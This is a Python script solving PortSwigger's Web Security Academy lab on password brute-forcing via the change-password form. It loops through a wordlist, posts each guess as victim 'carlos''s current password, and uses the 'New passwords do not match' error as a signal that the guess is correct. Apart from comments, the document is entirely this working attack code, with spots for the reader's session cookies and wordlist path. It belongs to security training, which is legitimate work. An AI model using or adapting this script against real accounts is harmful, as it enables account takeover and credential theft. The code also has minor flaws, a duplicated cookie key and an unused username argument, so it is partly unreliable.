# Lab14 from portswigger: Password brute-force via password change.
import requests
from termcolor import colored

url = "https://0a75006b048222f5c0aa12fd00e60006.web-security-academy.net:443/my-account/change-password" # Set the url.
cookies = {"session":"XLvTmwxX4DiiymwFKgp2wKj9EZ3DIEo8", 
           "session": "ebKbpPbCqIyd0Fdcg3Aj5fJUpqbnt1iK"
    } # Change them with your sessions values.

def brute_forcer(username):
    with open("/PATH/passwords.txt","r") as file: # Modify it with the passwords list path.
        for password in file:
            password = password.strip()
            
            data = {"username": "carlos",
                    "current-password": password, 
                    "new-password-1": "sad", 
                    "new-password-2": "so sad"
                }
            response = requests.post(url, cookies=cookies, data=data)
            # The valid password for the victim will be known when the web app check the current password and find it's a correct current password and the 2 new passwords doesn't match themself.
            if "New passwords do not match" in response.text:
                print(colored(f"[+] Valid password is found... ","green"))
                return password
            else:
                print(colored(f"[!!] Incorrect password: {password}\n","red"))    
                   
def main():
    username = "carlos"
    password = brute_forcer(username)
    print()
    print(colored(f"[+] Password: --> {password}","green"))    

if __name__ == '__main__':
    main() 


